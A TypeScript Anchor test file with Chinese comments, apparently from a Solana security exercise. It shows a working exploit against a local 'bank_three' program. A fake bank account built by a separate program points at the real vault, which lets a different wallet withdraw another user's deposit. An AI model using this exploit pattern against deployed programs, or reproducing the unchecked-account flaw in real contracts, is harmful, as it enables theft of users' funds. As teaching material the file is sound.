import * as anchor from "@coral-xyz/anchor";
import { Program } from "@coral-xyz/anchor";
import { BankThree } from "../target/types/bank_three";

describe("bank_three", () => {
  // Configure the client to use the local cluster.
  const provider = anchor.AnchorProvider.env();
  const connection = provider.connection;
  const wallet = provider.wallet as anchor.Wallet;
  anchor.setProvider(provider);

  const program = anchor.workspace.BankThree as Program<BankThree>;
  const exploitProgram = anchor.workspace.FakeBank as Program<FakeBank>;
  //   因为我们要改变一个权威
  // 从一个钱包到另一个钱包,漏洞利用展示
  //  创建了钱包密钥对要对其签名，因为它无法做
  const authority = anchor.web3.Keypair.generate();
  // 转移一笔钱
  const amount = 1_000_000;
  // 转账之前，我们要提取我们的转账金额
  // 是为了能执行交易
  before(async () => {
    // 在转账之前，我们要确定 钱包里面有钱
    const walletBalance = await connection.getBalance(wallet.publicKey);
    console.log("walletBalance", walletBalance);
    const authorityBalanceNew = await connection.getBalance(authority.publicKey);
    console.log("authorityBalance", authorityBalanceNew);


    const transferAmount = 1 * anchor.web3.LAMPORTS_PER_SOL;
    // 为新钱包提供金额 
    const tx = new anchor.web3.Transaction().add(
      anchor.web3.SystemProgram.transfer({
        fromPubkey: provider.wallet.publicKey,
        toPubkey: authority.publicKey,
        lamports: transferAmount,
      })
    ).add(
      anchor.web3.SystemProgram.transfer({
        fromPubkey: provider.wallet.publicKey,
        toPubkey: authority.publicKey,
        lamports: transferAmount,
      })
    );
    const signature = await provider.sendAndConfirm(tx);
    console.log("signature", signature);
    
    
    const authorityBalance = await connection.getBalance(authority.publicKey);
    console.log("authorityBalance", authorityBalance);

  });
  // 存款
  it("deposit", async () => {
    // 存款
    const transaction  = await program.methods
    .deposit(new anchor.BN(amount))
    .accounts({
      authority: authority.publicKey,      
    }).transaction();
    // 发送交易
    const signature = await anchor.web3.sendAndConfirmTransaction(
      connection,
      transaction,
      [authority],
      {
        skipPreflight: true,
        commitment: "confirmed",
      }
    );
    console.log("signature", signature);
    // 我们有了保险库的钥匙
    const [vault] = anchor.web3.PublicKey.findProgramAddressSync(
      [Buffer.from("vault")],
      program.programId
    );
    // 漏洞
    const [fakeBank] = anchor.web3.PublicKey.findProgramAddressSync(
      [Buffer.from("bank")],
      exploitProgram.programId
    );

    // 创建 一个虚假的银行账户
    // 我们创建一个交易 这将与漏洞利用程序一起使用
    const fakeBankTx = await exploitProgram.methods
    .initialize(vault)
    //初始化保险库
      .accounts({
        fakeAuthority: wallet.publicKey,        
      })
      .transaction();
    
      await anchor.web3.sendAndConfirmTransaction(
        connection,
        fakeBankTx,
        [wallet.payer],
        {
          skipPreflight: true,
          commitment: "confirmed",
        }
      );

      // 与那家新的假银行，进行提款交易
      const exploitTransaction = await program.methods
      .withdraw(new anchor.BN(amount))
      .accounts({authority: wallet.publicKey,bank: fakeBank})
      .transaction();
      const exploitSignature = await anchor.web3.sendAndConfirmTransaction(
        connection,
        exploitTransaction,
        [wallet.payer],
        {
          skipPreflight: true,
          commitment: "confirmed",
        }
      );
      console.log("exploitSignature", exploitSignature);

  });
});
